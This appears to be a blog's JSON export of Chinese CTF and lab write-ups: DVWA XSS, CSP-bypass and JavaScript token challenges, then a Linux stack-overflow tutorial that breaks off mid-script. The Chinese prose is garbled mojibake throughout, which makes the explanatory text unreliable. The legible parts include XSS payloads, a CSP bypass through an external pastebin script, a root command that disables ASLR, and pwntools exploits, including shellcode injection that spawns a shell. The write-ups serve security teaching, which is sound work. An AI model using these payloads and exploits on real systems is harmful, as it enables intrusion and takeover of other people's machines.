ï¼ˆé€šå¸¸ä»¥æµè§ˆå™¨ç«¯è„šæœ¬çš„å½¢å¼ï¼‰å‘é€ç»™ä¸åŒçš„æœ€ç»ˆç”¨æˆ·æ—¶ï¼Œå°±ä¼šå‘ç”ŸXSSæ”»å‡»ã€‚å…è®¸è¿™äº›æ”»å‡»æˆåŠŸçš„ç¼ºé™·éå¸¸æ™®éï¼Œå¹¶ä¸”å‘ç”Ÿåœ¨ä½¿ç”¨è¾“å‡ºä¸­çš„ç”¨æˆ·è¾“å…¥çš„Webåº”ç”¨ç¨‹åºçš„ä»»ä½•åœ°æ–¹ï¼Œè€Œä¸éªŒè¯æˆ–ç¼–ç å®ƒã€‚ æ”»å‡»è€…å¯ä»¥ä½¿ç”¨XSSå°†æ¶æ„è„šæœ¬å‘é€ç»™æ¯«æ— æˆ’å¿ƒçš„ç”¨æˆ·ã€‚æœ€ç»ˆç”¨æˆ·çš„æµè§ˆå™¨æ— æ³•çŸ¥é“è¯¥è„šæœ¬ä¸åº”è¯¥è¢«ä¿¡ä»»ï¼Œå¹¶å°†æ‰§è¡ŒJavaScriptã€‚å› ä¸ºå®ƒè®¤ä¸ºè„šæœ¬æ¥è‡ªå¯é æ¥æºï¼Œæ‰€ä»¥æ¶æ„è„šæœ¬å¯ä»¥è®¿é—®æ‚¨çš„æµè§ˆå™¨ä¿ç•™å¹¶ä¸è¯¥ç«™ç‚¹ä¸€èµ·ä½¿ç”¨çš„ä»»ä½•cookieï¼Œä¼šè¯ä»¤ç‰Œæˆ–å…¶ä»–æ•æ„Ÿä¿¡æ¯ã€‚è¿™äº›è„šæœ¬ç”šè‡³å¯ä»¥é‡å†™HTMLé¡µé¢çš„å†…å®¹ã€‚ XSSå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ã€‚ XSSæ˜¯æ°¸ä¹…æ€§çš„ï¼Œç›´åˆ°é‡ç½®æ•°æ®åº“æˆ–æ‰‹åŠ¨åˆ é™¤æœ‰æ•ˆè´Ÿè½½ã€‚ æŸ¥çœ‹æºç trimæ˜¯å»é™¤æ‰ç”¨æˆ·è¾“å…¥å†…å®¹å‰åçš„ç©ºæ ¼ã€‚stripslashesæ˜¯å»é™¤åæ–œæ ï¼Œä¸¤ä¸ªåªä¼šå»é™¤ä¸€ä¸ªã€‚mysqli_real_escap_stringè¿‡æ»¤æ‰å†…å®¹ä¸­ç‰¹æ®Šå­—ç¬¦ï¼Œåƒx00,n,r,,â€™,â€,x1aç­‰ï¼Œæ¥é¢„é˜²æ•°æ®åº“æ”»å‡»ã€‚12345678910111213141516171819202122&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitize name input $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; æ’å…¥ä¹‹åä¼šæˆä¸ºé¡µé¢çš„å…ƒç´ æ˜¾ç¤ºå‡ºæ¥&lt;div id=&quot;guestbook_comments&quot;&gt;Name: 11&lt;br /&gt;Message: 111&lt;br /&gt;&lt;/div&gt;çœ‹ä¸€ä¸‹æäº¤çš„æ–¹å¼ï¼štxtName=22&amp;mtxMessage=222&amp;btnSign=Sign+Guestbookç›´æ¥æ’å…¥scriptè¯­å¥ï¼ŒtxtName=22&lt;script&gt;alert(1)&lt;/script&gt;&amp;mtxMessage=222&amp;btnSign=Sign+Guestbook mediumæ¨¡å¼æºç ä¸­å¢åŠ äº†å‡ ä¸ªå‡½æ•°çš„ä½¿ç”¨ï¼š123* $message = strip_tags(addslashes($message)); å‰¥å»å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP çš„æ ‡ç­¾ã€‚* $message = htmlspecialchars( $message ); æŠŠé¢„å®šä¹‰çš„å­—ç¬¦ &quot;&lt;&quot; ï¼ˆå°äºï¼‰å’Œ &quot;&gt;&quot; ï¼ˆå¤§äºï¼‰è½¬æ¢ä¸º HTML å®ä½“ï¼š* $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name ); ç»•è¿‡å®‰å…¨ç­–ç•¥easyæ¨¡å¼ å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ç”¨äºå®šä¹‰å¯ä»¥ä»ä¸­åŠ è½½æˆ–æ‰§è¡Œè„šæœ¬å’Œå…¶ä»–èµ„æºçš„ä½ç½®ã€‚æœ¬å•å…ƒå°†å¼•å¯¼æ‚¨æ ¹æ®å¼€å‘äººå‘˜å¸¸è§é”™è¯¯ç»•è¿‡ç­–ç•¥ã€‚è¿™äº›æ¼æ´éƒ½ä¸æ˜¯CSPä¸­çš„å®é™…æ¼æ´ï¼Œå®ƒä»¬æ˜¯å®æ–½æ¼æ´çš„æ¼æ´ã€‚ 12345678910111213141516171819202122&lt;?php$headerCSP = \"Content-Security-Policy: script-src 'self' https://pastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;\"; // allows js from self, pastebin.com, jquery and google analytics.header($headerCSP);# https://pastebin.com/raw/R570EE00?&gt;&lt;?phpif (isset ($_POST['include'])) &#123;$page[ 'body' ] .= \" &lt;script src='\" . $_POST['include'] . \"'&gt;&lt;/script&gt;\";&#125;$page[ 'body' ] .= '&lt;form name=\"csp\" method=\"POST\"&gt; &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt; &lt;input size=\"50\" type=\"text\" name=\"include\" value=\"\" id=\"include\" /&gt; &lt;input type=\"submit\" value=\"Include\" /&gt;&lt;/form&gt;'; ä¼šåœ¨é¡µé¢é‡Œå¢åŠ ä¸€ä¸ªbody&lt;script src=&#39;&quot; . $_POST[&#39;include&#39;] . &quot;&#39;&gt;&lt;/script&gt;è¿™é‡Œåœ¨æºç ä¸­è§„å®šäº†ä¿¡ä»»çš„è„šæœ¬æºï¼šscript-src &#39;self&#39; https://pastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, jquery and google analytics.è¾“å…¥æºç ä¸­æç¤ºçš„https://pastebin.com/raw/R570EE00ï¼Œå¼¹çª—æˆåŠŸ mediumæ¨¡å¼å¦‚æœä½ è¦ä½¿ç”¨ script æ ‡ç­¾åŠ è½½ javascript, ä½ éœ€è¦æŒ‡æ˜å…¶ nonce å€¼$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#39;;&quot;;æ¯”å¦‚ï¼š&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt; JavaScript Attackseasyæ¨¡å¼ æœ¬èŠ‚ä¸­çš„æ”»å‡»æ—¨åœ¨å¸®åŠ©æ‚¨äº†è§£JavaScriptåœ¨æµè§ˆå™¨ä¸­çš„ä½¿ç”¨æ–¹å¼ä»¥åŠå¦‚ä½•æ“ä½œå®ƒã€‚æ”»å‡»å¯ä»¥é€šè¿‡åˆ†æç½‘ç»œæµé‡æ¥è¿›è¡Œï¼Œä½†è¿™ä¸æ˜¯é‡ç‚¹ï¼Œä¹Ÿå¯èƒ½è¦å›°éš¾å¾—å¤šã€‚åªéœ€æäº¤â€œæˆåŠŸâ€ä¸€è¯å³å¯èµ¢å¾—å…³å¡ã€‚æ˜¾ç„¶ï¼Œå®ƒå¹¶ä¸é‚£ä¹ˆå®¹æ˜“ï¼Œæ¯ä¸ªçº§åˆ«å®ç°ä¸åŒçš„ä¿æŠ¤æœºåˆ¶ï¼Œé¡µé¢ä¸­åŒ…å«çš„JavaScriptå¿…é¡»è¿›è¡Œåˆ†æï¼Œç„¶åè¿›è¡Œæ“ä½œä»¥ç»•è¿‡ä¿æŠ¤ã€‚ æç¤ºæˆ‘ä»¬Submit the word â€œsuccessâ€ to win.ä½†æ˜¯è¾“å…¥successå´è¿”å›Invalid token.è¯´æ˜tokenå€¼ä¸å¯¹åŠ²ï¼Œåå°åº”è¯¥æ˜¯æ¯”è¾ƒè¾“å…¥çš„å­—ç¬¦ä¸²ä¸â€˜successâ€™ã€‚æŸ¥çœ‹æºç å‘ç°tokenå€¼æ˜¯åœ¨å‰å°è®¡ç®—çš„ï¼Œmd5(rot13(phrase))123456function generate_token() &#123; var phrase = document.getElementById(&quot;phrase&quot;).value; document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));&#125;generate_token(); ç„¶è€Œï¼Œphraseçš„å€¼ç­‰äºChangeMe&lt;input type=&quot;text&quot; name=&quot;phrase&quot; value=&quot;ChangeMe&quot; id=&quot;phrase&quot;&gt;å› æ­¤è®¡ç®—å‡ºæ¥çš„tokenä¹Ÿæ˜¯ä¸å¯¹çš„ï¼Œæˆ‘ä»¬åœ¨chromeçš„æ§åˆ¶å°ç›´æ¥è®¡ç®—12md5(rot13(&quot;success&quot;))&quot;38581812b435834ebf84ebcc2c6424d6&quot; æŠŠå€¼ç»™éšè—çš„å…ƒç´ &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;8b479aefbd90795395b3e7089ae0dc09&quot; id=&quot;token&quot;&gt;ç„¶åæäº¤success mediumæ¨¡å¼ç”Ÿæˆtokençš„ä»£ç åœ¨jsæ–‡ä»¶ä¸­1234567891011function do_something(e) &#123; for (var t = \"\", n = e.length - 1; n &gt;= 0; n--) t += e[n]; return t&#125;setTimeout(function () &#123; do_elsesomething(\"XX\")&#125;, 300);function do_elsesomething(e) &#123; document.getElementById(\"token\").value = do_something(e + document.getElementById(\"phrase\").value + \"XX\")&#125; è¾“å…¥successï¼Œç„¶åæ§åˆ¶å°è¿è¡Œdo_elsesomething(â€œXXâ€)å°±å¯ä»¥æ‹¿åˆ°token","categories":[{"name":"web","slug":"web","permalink":"https://cool-y.github.io/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://cool-y.github.io/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"https://cool-y.github.io/tags/ctf/"}]},{"title":"Linux Pwn-ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨","slug":"linux-pwn-32","date":"2019-07-16T09:11:42.000Z","updated":"2021-04-10T13:43:18.149Z","comments":true,"path":"2019/07/16/linux-pwn-32/","link":"","permalink":"https://cool-y.github.io/2019/07/16/linux-pwn-32/","excerpt":"","text":"refï¼š CTF-WIKIï¼šhttps://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/è’¸ç±³å¤§ä½¬çš„ä¸€æ­¥ä¸€æ­¥å­¦rop http://www.anquan.us/static/drops/tips-6597.htmlhttps://bbs.pediy.com/thread-221734.htm å·¥å…·ï¼š objdumpã€lddã€ROPgadgetã€readelfã€https://ctf-wiki.github.io/ctf-tools/https://github.com/ctf-wiki/ctf-challenges 0x00 Control Flow hijackå’ŒWindowsä¸€æ ·ï¼Œæ ˆæº¢å‡ºçš„æ ¹æœ¬åŸå› åœ¨äºå½“å‰è®¡ç®—æœºçš„ä½“ç³»ç»“æ„æ²¡æœ‰åŒºåˆ†ä»£ç æ®µå’Œæ•°æ®æ®µï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹æ•°æ®æ®µçš„å†…å®¹ï¼ˆè¿”å›åœ°å€ï¼‰ï¼Œæ”¹å˜ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œä»è€Œè¾¾åˆ°ç¨‹åºæµåŠ«æŒçš„æ•ˆæœã€‚æ”¹å˜è®¡ç®—æœºä½“ç³»æ¥è§„é¿æ¼æ´ç›®å‰æ˜¯ä¸å¯èƒ½çš„ï¼Œé˜²å¾¡è€…ä¸ºäº†åº”å¯¹è¿™ç§æ”»å‡»ï¼Œæå‡ºäº†å„ç§å¢å¤§æ”»å‡»éš¾åº¦çš„æªæ–½ï¼ˆæ²¡æœ‰ç»å¯¹å®‰å…¨çš„ç³»ç»Ÿï¼‰ï¼Œæœ€å¸¸è§çš„æœ‰ï¼šDEPå †æ ˆä¸å¯æ‰§è¡Œã€ASLRå†…å­˜åœ°å€éšæœºåŒ–ã€GS/Canaryæ ˆä¿æŠ¤ç­‰ã€‚æˆ‘ä»¬ä»æœ€ç®€å•çš„å…¥æ‰‹ï¼Œä¸å¼€å¯ä»»ä½•é˜²æŠ¤ï¼Œå…ˆäº†è§£æ ˆæº¢å‡ºçš„åŸºæœ¬æ“ä½œï¼Œç„¶åé€æ­¥å¢åŠ é˜²å¾¡æªæ–½ã€‚ å¯»æ‰¾å±é™©å‡½æ•°è¿™é‡Œæœ‰ä¸€ä¸ªæ¼æ´ç¨‹åº12345678910111213#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;void vulnerable() &#123; char s[12]; gets(s); puts(s); return;&#125;int main(int argc, char **argv) &#123; vulnerable(); return 0;&#125; å½“æˆ‘ä»¬çœ‹åˆ°getsæ—¶å°±åº”è¯¥çŸ¥é“å¦‚ä½•å…¥æ‰‹äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å±é™©çš„å‡½æ•°ï¼Œæ— æ¡ä»¶çš„æ¥å—ä»»æ„å¤§çš„å­—ç¬¦ä¸²ã€‚å†å²ä¸Šï¼Œè«é‡Œæ–¯è •è™«ç¬¬ä¸€ç§è •è™«ç—…æ¯’å°±åˆ©ç”¨äº† gets è¿™ä¸ªå±é™©å‡½æ•°å®ç°äº†æ ˆæº¢å‡ºã€‚å…ˆè¿›è¡Œç¼–è¯‘ï¼Œå…³é—­é˜²å¾¡æªæ–½ï¼š12345678$ gcc -m32 -no-pie -fno-stack-protector -z execstack stack1.c -o stack1stack1.c: In function â€˜vulnerableâ€™:stack1.c:6:3: warning: implicit declaration of function â€˜getsâ€™; did you mean â€˜fgetsâ€™? [-Wimplicit-function-declaration] gets(s); ^~~~ fgets/tmp/ccUuPrSy.o: In function `vulnerable&apos;:stack1.c:(.text+0x45): warning: the `gets&apos; function is dangerous and should not be used. ç¼–è¯‘å™¨éƒ½ä¼šæç¤ºä½ ï¼Œgetsä¸è¦å†ç”¨äº†ã€‚-fno-stack-protector å’Œ-z execstackåˆ†ä¾¿ä¼šå…³æ‰æ ˆä¿æŠ¤çš„DEP.-no-PIEå…³é—­ PIEï¼ˆPosition Independent Executableï¼‰ï¼Œé¿å…åŠ è½½åŸºå€è¢«æ‰“ä¹±ã€‚æ¥ä¸‹æ¥å…³é—­æ•´ä¸ªlinuxç³»ç»Ÿçš„ASLRä¿æŠ¤ï¼š12345$ suPassword:root@ubuntu:/home/han/ck/pwn/linux/stack_demo# echo 0 &gt; /proc/sys/kernel/randomize_va_spaceroot@ubuntu:/home/han/ck/pwn/linux/stack_demo# exitexit è®¡ç®—æº¢å‡ºç‚¹çš„ä½ç½®ä»€ä¹ˆæ˜¯æº¢å‡ºç‚¹çš„ä½ç½®ï¼šä»ç¼“å†²åŒºåˆ°è¦†ç›–è¿”å›åœ°å€æ‰€éœ€è¦çš„å­—èŠ‚æ•°æˆ‘ä»¬åŒæ ·ä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…·pattern_createå’Œpattern_offsetæ¥è®¡ç®—ï¼Œè¿™é‡Œæˆ‘ä»¬å…ˆæ‰‹åŠ¨è®¡ç®—ï¼šæŠŠstack1æ‹–å…¥IDAè¿›è¡Œåæ±‡ç¼–åˆ†æï¼š1234567int vulnerable()&#123; char s; // [sp+4h] [bp-14h]@1 gets(&amp;s); return puts(&amp;s);&#125; åœ¨ä¼ªä»£ç çª—å£ï¼Œæˆ‘ä»¬å¯çœ‹åˆ°å˜é‡så’Œbpçš„è·ç¦»ä¸º14hï¼Œå†åŠ ä¸Šold bpçš„4å­—èŠ‚ï¼Œåˆ°retçš„è·ç¦»å°±æ˜¯18hã€‚123456789101112 +-----------------+ | retaddr | +-----------------+ | saved ebp | ebp---&gt;+-----------------+ | | | | | | | | | | | |s,ebp-0x14--&gt;+-----------------+ åŠ«æŒretçš„åœ°å€è¿™é‡Œæˆ‘ä»¬æƒ³è®©ç¨‹åºè·³è½¬åˆ°success()ï¼Œä»IDAç›´æ¥å¯ä»¥è·å–0x08048456123456789101112131415161718192021.text:08048456 success proc near.text:08048456.text:08048456 var_4 = dword ptr -4.text:08048456.text:08048456 push ebp.text:08048457 mov ebp, esp.text:08048459 push ebx.text:0804845A sub esp, 4.text:0804845D call __x86_get_pc_thunk_ax.text:08048462 add eax, 1B9Eh.text:08048467 sub esp, 0Ch.text:0804846A lea edx, (aYouHavaAlready - 804A000h)[eax] ; &quot;You Hava already controlled it.&quot;.text:08048470 push edx ; s.text:08048471 mov ebx, eax.text:08048473 call _puts.text:08048478 add esp, 10h.text:0804847B nop.text:0804847C mov ebx, [ebp+var_4].text:0804847F leave.text:08048480 retn.text:08048480 success endp é‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ„é€ çš„å­—ç¬¦ä¸²ä¸ºï¼š10x18*&apos;a&apos;+success_addr è¿™æ ·å°±ä¼šå°†retaddrè¦†ç›–å·å³¨å“¦success_addr,æ­¤æ—¶æ ˆç»“æ„ä¸ºï¼š123456789101112 +-----------------+ | 0x0804843B | +-----------------+ | aaaa | ebp---&gt;+-----------------+ | | | | | | | | | | | |s,ebp-0x14--&gt;+-----------------+ pwnæµ‹è¯•ä½¿ç”¨pwntoolsï¼Œæ€ä¹ˆä½¿ç”¨ï¼Œä»¥å…·ä½“çš„expæ¥ä»‹ç»ï¼Œæ¯”å¦‚stack1çš„expå¦‚ä¸‹ï¼š1234567891011from pwn import *p = process(&apos;./stack1&apos;)ret_addr = 0x08048456offset = 0x18payload = &apos;A&apos; * offset + p32(ret_addr)print(ret_addr,p32(ret_addr))p.sendline(payload)p.interactive() è¿æ¥æœ¬åœ°process(),è¿œç¨‹remote() æ•°æ®å¤„ç†p32ã€p64æ˜¯æ‰“åŒ…ï¼ˆè½¬æ¢æˆäºŒè¿›åˆ¶ï¼‰ï¼Œu32ã€u64æ˜¯è§£åŒ… IOæ¨¡å—send(data) : å‘é€æ•°æ®sendline(data) : å‘é€ä¸€è¡Œæ•°æ®ï¼Œç›¸å½“äºåœ¨æœ«å°¾åŠ \\ninteractive() : ä¸shelläº¤äº’ æ‰§è¡Œexpï¼š12345678$ python stack1.py[+] Starting local process &apos;./stack1&apos;: pid 8328(134513750, &apos;V\\x84\\x04\\x08&apos;)[*] Switching to interactive modeAAAAAAAAAAAAAAAAAAAAAAAAV\\x84\\x0You Hava already controlled it.[*] Got EOF while reading in interactive$ 0X01 ret2shellcodeåŸç†ret2shellcodeï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œ shellcode ä»£ç ã€‚shellcode æŒ‡çš„æ˜¯ç”¨äºå®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œå¸¸è§çš„åŠŸèƒ½ä¸»è¦æ˜¯è·å–ç›®æ ‡ç³»ç»Ÿçš„ shellã€‚ä¸€èˆ¬æ¥è¯´ï¼Œshellcode éœ€è¦æˆ‘ä»¬è‡ªå·±å¡«å……ã€‚è¿™å…¶å®æ˜¯å¦å¤–ä¸€ç§å…¸å‹çš„åˆ©ç”¨æ–¹æ³•ï¼Œå³æ­¤æ—¶æˆ‘ä»¬éœ€è¦è‡ªå·±å»å¡«å……ä¸€äº›å¯æ‰§è¡Œçš„ä»£ç ã€‚ åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œè¦æƒ³æ‰§è¡Œ shellcodeï¼Œéœ€è¦å¯¹åº”çš„ binary åœ¨è¿è¡Œæ—¶ï¼Œshellcode æ‰€åœ¨çš„åŒºåŸŸå…·æœ‰å¯æ‰§è¡Œæƒé™(NX disabled)ã€‚ æ£€æŸ¥ä¿æŠ¤æƒ…å†µ1234567891011$ checksec ret2shellcode[*] &apos;/home/han/ck/pwn/linux/re2shellcode/ret2shellcode&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments$ cat /proc/sys/kernel/randomize_va_space0 å¯ä»¥çœ‹å‡ºæºç¨‹åºå‡ ä¹æ²¡æœ‰å¼€å¯ä»»ä½•ä¿æŠ¤ï¼Œå¹¶ä¸”æœ‰å¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œæ®µã€‚ æŸ¥çœ‹å±é™©å‡½æ•°123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No system for you this time !!!&quot;); gets((char *)&amp;v4); strncpy(buf2, (const char *)&amp;v4, 0x64u); printf(&quot;bye bye ~&quot;); return 0;&#125; å¯ä»¥çœ‹åˆ°ï¼Œæ¼æ´å‡½æ•°ä¾ç„¶è¿˜æ˜¯getsï¼Œä¸è¿‡è¿™æ¬¡è¿˜æŠŠv4å¤åˆ¶åˆ°äº†buf2å¤„ã€‚12.bss:0804A080 public buf2.bss:0804A080 ; char buf2[100] é€šè¿‡sudo cat /proc/[pid]/mapsæŸ¥çœ‹,ä¼šå‘ç°buf2å’Œstackéƒ½æ˜¯rwxçš„ã€‚ è®¡ç®—æº¢å‡ºç‚¹å¯ä»¥çœ‹åˆ°è¯¥å­—ç¬¦ä¸²æ˜¯é€šè¿‡ç›¸å¯¹äº esp çš„ç´¢å¼•ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›è¡Œè°ƒè¯•ï¼Œå°†æ–­ç‚¹ä¸‹åœ¨ call getså¤„ï¼ŒæŸ¥çœ‹ espï¼Œebp123456789101112131415161718192021222324252627282930313233343536[----------------------------------registers-----------------------------------]EAX: 0xffffc99c --&gt; 0xf7ffd000 --&gt; 0x26f34EBX: 0x0ECX: 0xf7fb2dc7 --&gt; 0xfb38900aEDX: 0xf7fb3890 --&gt; 0x0ESI: 0xf7fb2000 --&gt; 0x1d4d6cEDI: 0x0EBP: 0xffffca08 --&gt; 0x0ESP: 0xffffc980 --&gt; 0xffffc99c --&gt; 0xf7ffd000 --&gt; 0x26f34EIP: 0x8048593 (&lt;main+102&gt;: call 0x80483d0 &lt;gets@plt&gt;)EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048587 &lt;main+90&gt;: call 0x80483e0 &lt;puts@plt&gt; 0x804858c &lt;main+95&gt;: lea eax,[esp+0x1c] 0x8048590 &lt;main+99&gt;: mov DWORD PTR [esp],eax=&gt; 0x8048593 &lt;main+102&gt;: call 0x80483d0 &lt;gets@plt&gt; 0x8048598 &lt;main+107&gt;: mov DWORD PTR [esp+0x8],0x64 0x80485a0 &lt;main+115&gt;: lea eax,[esp+0x1c] 0x80485a4 &lt;main+119&gt;: mov DWORD PTR [esp+0x4],eax 0x80485a8 &lt;main+123&gt;: mov DWORD PTR [esp],0x804a080Guessed arguments:arg[0]: 0xffffc99c --&gt; 0xf7ffd000 --&gt; 0x26f34[------------------------------------stack-------------------------------------]0000| 0xffffc980 --&gt; 0xffffc99c --&gt; 0xf7ffd000 --&gt; 0x26f340004| 0xffffc984 --&gt; 0x00008| 0xffffc988 --&gt; 0x10012| 0xffffc98c --&gt; 0x00016| 0xffffc990 --&gt; 0x00020| 0xffffc994 --&gt; 0xc300000024| 0xffffc998 --&gt; 0x00028| 0xffffc99c --&gt; 0xf7ffd000 --&gt; 0x26f34[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, 0x08048593 in main () at ret2shellcode.c:1414 ret2shellcode.c: No such file or directory. å¯ä»¥çœ‹åˆ° esp ä¸º 0xffffc980ï¼Œebp ä¸º0xffffca08ï¼ŒåŒæ—¶ v4 ç›¸å¯¹äº esp çš„ç´¢å¼•ä¸º [esp+0x1c]ï¼Œæ‰€ä»¥ï¼Œv4 çš„åœ°å€ä¸º 0xffffc99cï¼Œæ‰€ä»¥ s ç›¸å¯¹äº ebp çš„åç§»ä¸º 0x6Cï¼Œæ‰€ä»¥ç›¸å¯¹äºè¿”å›åœ°å€çš„åç§»ä¸º 0x6c+4ã€‚ åŠ«æŒretçš„åœ°å€è¿™æ¬¡æˆ‘ä»¬æƒ³è¦ç¨‹åºæ‰§è¡Œshellcodeï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŠŠshellcodeæ”¾åœ¨ä»»ä½•å¯æ‰§è¡Œçš„ä½ç½®ï¼Œæ¯”å¦‚buf2æˆ–æ ˆä¸Šï¼Œä½ç½®çš„åœ°å€å°±æ˜¯æˆ‘ä»¬éœ€è¦è¦†ç›–ret_addrçš„å€¼ pwnæµ‹è¯•æ§åˆ¶ç¨‹åºæ‰§è¡Œbssæ®µçš„shellcode12345678910111213from pwn import *p = process(&apos;./ret2shellcode&apos;)ret_addr = 0x0804A080offset = 0x6c + 4shellcode = asm(shellcraft.i386.linux.sh())payload = shellcode.ljust(offset,&apos;a&apos;) + p32(ret_addr)#payload = shellcode + &apos;a&apos;*(offset - len(shellcode)) + p32(ret_addr)p.sendline(payload)p.interactive() Shellcodeç”Ÿæˆå™¨ä½¿ç”¨shellcraftå¯ä»¥ç”Ÿæˆå¯¹åº”çš„æ¶æ„çš„shellcodeä»£ç ï¼Œç›´æ¥ä½¿ç”¨é“¾å¼è°ƒç”¨çš„æ–¹æ³•å°±å¯ä»¥å¾—åˆ°å¦‚32ä½linuxï¼šshellcraft.i386.linux.sh()shellcode.ljust(offset,â€™aâ€™)åœ¨shellcodeåé¢å¡«å……offset - len(shellcode)é•¿åº¦çš„å­—ç¬¦â€˜aâ€™ æ±‡ç¼–ä¸åæ±‡ç¼–ä½¿ç”¨asmæ¥è¿›è¡Œæ±‡ç¼–ï¼Œä½¿ç”¨disasmè¿›è¡Œåæ±‡ç¼–æŒ‡å®šcpuç±»å‹ä»¥åŠæ“ä½œç³»ç»Ÿï¼šasm(â€˜nopâ€™, arch=â€™armâ€™ï¼Œos = â€˜linuxâ€™ï¼Œendian = â€˜littleâ€™ï¼Œword_size = 32) 0x02 ret2textåŸç†ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)ã€‚å…¶å®ï¼Œè¿™ç§æ”»å‡»æ–¹æ³•æ˜¯ä¸€ç§ç¬¼ç»Ÿçš„æè¿°ã€‚æˆ‘ä»¬æ§åˆ¶æ‰§è¡Œç¨‹åºå·²æœ‰çš„ä»£ç çš„æ—¶å€™ä¹Ÿå¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œå¥½å‡ æ®µä¸ç›¸é‚»çš„ç¨‹åºå·²æœ‰çš„ä»£ç  (ä¹Ÿå°±æ˜¯ gadgets)ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¦è¯´çš„ ROPã€‚ ROPä¸éœ€è¦å»æ‰§è¡Œæ ˆä¸­çš„shellcodeï¼Œå› æ­¤å¯ä»¥ç»•è¿‡DEPä¿æŠ¤ æ£€æŸ¥ä¿æŠ¤1234567$ checksec ret2text[*] &apos;/home/han/ck/pwn/linux/ret2text/ret2text&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) å¼€å¯äº†DEPï¼Œé—®é¢˜ä¸å¤§ï¼Œå› ä¸ºæ‰§è¡Œçš„å·²æœ‰çš„ä»£ç  æ£€æŸ¥å±é™©å‡½æ•°1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\"There is something amazing here, do you know anything?\"); gets((char *)&amp;v4); printf(\"Maybe I will tell you next time !\"); return 0;&#125; åŒæ ·è¿˜æ˜¯getså‡½æ•° è®¡ç®—åç§»å’Œä¸Šä¸€ä¸ªä¸€æ ·ï¼Œ0x6c+4 å¯»æ‰¾è·³æ¿åœ¨ä»£ç æ®µå‘ç°è°ƒç”¨ system(â€œ/bin/shâ€) çš„ä»£ç ï¼Œé‚£ä¹ˆç›´æ¥å°†retè¦†ç›–ä¸º0804863Aå°±èƒ½æ‹¿åˆ°shell1234567.text:0804862D call ___isoc99_scanf.text:08048632 mov eax, [ebp+input].text:08048635 cmp eax, [ebp+secretcode].text:08048638 jnz short locret_8048646.text:0804863A mov dword ptr [esp], offset command ; &quot;/bin/sh&quot;.text:08048641 call _system.text:08048646 æµ‹è¯•123456789101112from pwn import *p = process(&apos;./ret2text&apos;)ret_add = 